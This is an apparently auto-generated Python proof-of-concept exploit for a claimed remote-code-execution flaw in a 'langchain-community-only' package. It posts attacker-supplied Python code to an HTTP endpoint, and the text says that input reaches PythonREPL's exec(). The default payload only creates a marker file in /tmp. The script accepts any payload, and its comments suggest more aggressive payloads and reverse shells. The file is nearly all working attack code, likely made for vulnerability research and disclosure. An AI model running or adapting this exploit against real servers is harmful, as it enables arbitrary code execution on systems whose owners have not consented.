#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-012
# Sink: worker
# Auto-generated — run with: python3 rce_python_code_exec_worker.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE in langchain-community-only.

Vulnerability: User-controlled text input flows through vector store operations
              and eventually reaches PythonREPL's exec() call without sanitization.

Impact: Remote Code Execution (RCE) via arbitrary Python code injection.

Usage:
    python3 poc.py [--target http://localhost:8000/api/v1/trigger]
"""

import argparse
import sys
import requests
import time

# Default target URL (simulated web endpoint wrapping the vulnerable library)
DEFAULT_TARGET = "http://localhost:8000/api/v1/trigger"

# Benign payload to demonstrate RCE (creates a marker file)
# Change to something more aggressive for actual testing, but keep safe by default
BENIGN_PAYLOAD = "__import__('os').system('touch /tmp/poc_success.txt')"

def exploit(target_url: str, payload: str) -> None:
    """
    Send the malicious payload to the vulnerable endpoint.

    The payload is injected as the 'texts' parameter, which flows through:
        afrom_texts -> aadd_texts -> add_texts -> ... -> PythonREPL.run -> exec()

    Args:
        target_url: The URL of the vulnerable endpoint.
        payload: Python code to execute on the server.
    """
    print(f"[*] Targeting: {target_url}")
    print(f"[*] Payload: {payload!r}")

    # Prepare the request data
    # The vulnerable endpoint expects a JSON body with 'untrusted_user_input'
    # which maps to the 'texts' parameter in afrom_texts
    data = {
        "untrusted_user_input": payload
    }

    try:
        # Send POST request with timeout
        print("[*] Sending exploit request...")
        response = requests.post(
            target_url,
            json=data,
            timeout=10,
            headers={"Content-Type": "application/json"}
        )

        # Check response
        print(f"[*] HTTP Status: {response.status_code}")
        print(f"[*] Response body: {response.text[:500]}")

        if response.status_code == 200:
            print("[+] Exploit request succeeded (status 200)")
        else:
            print(f"[!] Unexpected status code: {response.status_code}")

    except requests.exceptions.ConnectionError:
        print(f"[-] Connection error: Could not reach {target_url}")
        print("    Make sure the target server is running and accessible.")
        sys.exit(1)
    except requests.exceptions.Timeout:
        print("[-] Request timed out after 10 seconds")
        sys.exit(1)
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")
        sys.exit(1)

def verify_exploit() -> bool:
    """
    Verify if the exploit was successful by checking for the marker file.

    This is a simple check; in a real scenario you'd use a reverse shell
    or other out-of-band verification.

    Returns:
        True if the marker file exists, False otherwise.
    """
    import os
    marker = "/tmp/poc_success.txt"
    if os.path.exists(marker):
        print(f"[+] Marker file {marker} exists - RCE confirmed!")
        return True
    else:
        print(f"[-] Marker file {marker} not found")
        return False

def main():
    parser = argparse.ArgumentParser(
        description="PoC for RCE in langchain-community-only vector store operations"
    )
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"Target URL (default: {DEFAULT_TARGET})"
    )
    parser.add_argument(
        "--payload",
        default=BENIGN_PAYLOAD,
        help="Python code to execute (default: touch /tmp/poc_success.txt)"
    )
    parser.add_argument(
        "--verify",
        action="store_true",
        help="Check if the exploit succeeded by looking for marker file"
    )

    args = parser.parse_args()

    print("=" * 60)
    print("langchain-community-only RCE PoC")
    print("=" * 60)
    print()

    # Step 1: Send the exploit
    exploit(args.target, args.payload)

    # Step 2: Optionally verify
    if args.verify:
        print()
        print("[*] Verifying exploit success...")
        time.sleep(1)  # Give the server time to execute
        verify_exploit()

    print()
    print("[*] Exploit completed.")

if __name__ == "__main__":
    main()
